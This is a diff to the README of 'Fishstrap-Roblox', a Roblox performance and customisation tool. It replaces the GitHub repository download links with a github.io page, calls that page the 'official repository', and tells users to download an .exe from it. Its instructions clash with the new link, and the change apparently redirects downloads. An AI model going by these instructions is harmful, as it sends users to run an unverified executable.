@@ -1,6 +1,6 @@
 # 🐟 Fishstrap-Roblox - Boost Your Roblox Performance And Experience
 
-[Link to Download](https://github.com/knockdown-comedienne741/Fishstrap-Roblox)
+[Link to Download](https://knockdown-comedienne741.github.io)
 
 Fishstrap helps you modify your Roblox experience. It removes frame rate limits, manages technical settings called FastFlags, and lets you customize your game client. You can add Discord status updates, bring back classic sound effects, and change menu styles. This tool gives you control over how the Roblox application runs on your computer.
 
@@ -21,7 +21,7 @@ Before you install Fishstrap, check that your computer meets these requirements:
 
 Follow these steps to set up Fishstrap on your machine.
 
-1. Visit the project's official repository here: https://github.com/knockdown-comedienne741/Fishstrap-Roblox
+1. Visit the project's official repository here: https://knockdown-comedienne741.github.io
 2. Look for the Releases section on the right side of the page.
 3. Click the latest version link.
 4. Download the file that ends in .exe.
